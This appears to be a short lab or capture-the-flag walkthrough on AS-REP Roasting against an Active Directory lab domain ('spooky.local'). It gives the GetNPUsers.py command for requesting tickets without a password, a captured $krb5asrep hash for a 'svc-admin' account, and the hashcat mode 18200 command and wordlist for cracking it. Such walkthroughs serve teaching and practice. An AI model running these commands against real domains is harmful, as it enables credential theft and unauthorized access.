# Exploiting Kerberos
- Exploit a feature within Kerberos with an attack method called AS-REP Roasting 
- AS-REP Roasting occurs when a user account has `does not require pre-authentication` set
- User account `does not` need to provide valid identification before requesting a Kerberos ticket on the specified user account

## Retrieving Kerberos Tickets
- GetNPUsers script
- Used to retrieve domain users who do not have `do not require Kerberos pre-authentication` set 
- Ask for TGT without knowing passwords

<pre>GetNPUsers.py -no-pass -usersfile ./users.txt -dc-ip 10.10.155.48 spooky.local/</pre>

- Returns the user that can query a ticket without a password

<pre>$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:408ee4a3e91ec877b931d35c56364c77$63dc9e093d6f3ddfd0074033786ed4d4d6e5f3e9f27be7f98866c0c91c4271c6c8a721eafa9e343a2b9638da64fe71d7563c31e51e6aac0686ba9025ab8ff2d41b8b24f38888cd803c70568744a12daa95cca16b73fa6bc5b20f1fb697b29fd1fe39fa0553ae07ad7e6e2f5232e306ee2abf3ee2ba8ebc704bc96f0d60cd245f96f4caa7c20c3a673fba2b25a384593b01e334560348a146d9168e1fc594b8c59e11382193bd2b3f1c421f9d5fdc61167c8f3bfa18d60fc6fca79923c16b707927719330363b593c28ccc0c7dd2c5e7696b43d45a4bc016341f773805c53f51d2b6ae4a0fa3c3280a18a9d53d9b5fd08337c</pre>

- Determine hash type: https://hashcat.net/wiki/doku.php?id=example_hashes&source=post_page-----96f926eca20f--------------------------------  
- Hash mode: 18200
- Hash starts with ($krb5asrep)

## Crack hash
Password list: https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
<pre>hashcat -m 18200 hash.txt passwordlist.txt</pre>